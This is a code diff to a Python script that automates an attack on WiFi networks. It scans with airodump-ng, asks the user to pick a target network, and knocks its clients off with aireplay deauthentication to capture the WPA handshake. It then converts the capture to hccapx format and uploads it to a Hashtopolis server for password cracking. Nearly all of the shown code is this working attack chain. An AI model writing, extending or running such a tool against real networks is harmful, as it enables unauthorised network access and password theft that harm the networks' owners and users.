@@ -9,6 +9,8 @@ from time import sleep
 
 from AireplayThread import AireplayThread
 from AirodumpThread import AirodumpThread
+from hashtopolisUploader import HashToPolisUploader
+from hccapxConverter import HccapxConverter
 from parseOutput import AiroParser
 
 airmon_cmd_template = 'airmon-ng'
@@ -76,6 +78,18 @@ def stopInterface(interface):
 def getRandomName():
     return ''.join(random.choice('0123456789ABCDEF') for i in range(5))
 
+def ask_for_network(parser):
+    print('Please select your desired network')
+    for idx, net in enumerate(parser.available_bssids):
+        print('{0}) {1} | {2}'.format(idx, net, parser.available_ESSID[idx]))
+
+    try:
+        selected = int(input())
+    except ValueError:
+        print('Input is not a number')
+        exit(-1)
+
+    return selected
 
 def main():
     interface = 'wlan1'
@@ -83,15 +97,15 @@ def main():
     if startInterface(interface):
         # continue, because airmon was successful
         output_name = 'output-{}'.format(getRandomName())
-        arg_list = list()
-        arg_list.append('--write')
-        arg_list.append(output_name)
-        arg_list.append('--output-format')
-        arg_list.append('csv')
+        scanning_arg_list = list()
+        scanning_arg_list.append('--write')
+        scanning_arg_list.append(output_name)
+        scanning_arg_list.append('--output-format')
+        scanning_arg_list.append('csv')
 
-        thread1 = AirodumpThread(1, interface, arg_list)
-        thread1.setDaemon(True)
-        thread1.start()
+        scanning_thread = AirodumpThread(1, interface, scanning_arg_list)
+        scanning_thread.setDaemon(True)
+        scanning_thread.start()
 
         startTime = time.time()
         print()
@@ -101,40 +115,66 @@ def main():
             sleep(2)
         print()
 
-        thread1.stop()
+        scanning_thread.stop()
+
         sleep(1)
-        if not thread1.is_alive():
-            print("Successfully stopped thread with id {}".format(thread1.thread_id))
+        if not scanning_thread.is_alive():
+            print("Successfully stopped thread with id {}".format(scanning_thread.thread_id))
 
         fileName = output_name + '-01.csv'
 
         parser = AiroParser(fileName)
         parser.pandaParse()
 
-        print('Please select your desired network')
-        for idx, net in enumerate(parser.available_bssids):
-            print('{0}) {1}'.format(idx, net))
+        selected = ask_for_network(parser)
 
-        try:
-            selected = int(input())
-        except ValueError:
-            print('Input is not a number')
-            exit(-1)
+        capture_output_name = 'capture-{}'.format(getRandomName())
+        capture_arg_list = list()
+        capture_arg_list.append('--write')
+        capture_arg_list.append(capture_output_name)
+        capture_arg_list.append('--channel')
+        capture_arg_list.append(str(parser.available_channels[selected]))
+        capture_arg_list.append('--bssid')
+        capture_arg_list.append(parser.available_bssids[selected])
 
-        thread2 = AireplayThread(2, interface, parser.available_bssids[selected])
-        thread2.setDaemon(True)
-        thread2.start()
+        print(capture_arg_list)
+
+        capture_thread = AirodumpThread(2,interface,capture_arg_list)
+        print('Starting thread to capture handshake!')
+        capture_thread.start()
+
+        deauth_thread = AireplayThread(3, interface, parser.available_bssids[selected])
+        deauth_thread.setDaemon(True)
+        deauth_thread.start()
 
         startTime = time.time()
         print()
         print('Giving aireplay time to deauth...', end='', flush=True)
-        while time.time() - startTime <= 10:
+        while time.time() - startTime <= 5:
             print('.', end='', flush=True)
             sleep(2)
         print()
 
-        thread2.stop()
+        deauth_thread.stop()
+
+        startTime = time.time()
+        print()
+        print('Giving airodump time to capture...', end='', flush=True)
+        while time.time() - startTime <= 30:
+            print('.', end='', flush=True)
+            sleep(2)
+        print()
+
+        capture_thread.stop()
         sleep(1)
+
+        converter = HccapxConverter()
+        success = converter.convert(capture_output_name,capture_output_name)
+        print(success)
+        if success:
+            print('Successfully converted cap file to hccapx format. Now uploading...')
+            uploader = HashToPolisUploader()
+            uploader.upload(capture_output_name+'.hccapx')
 
     else:
         print('Error starting interface {0}'.format(interface))
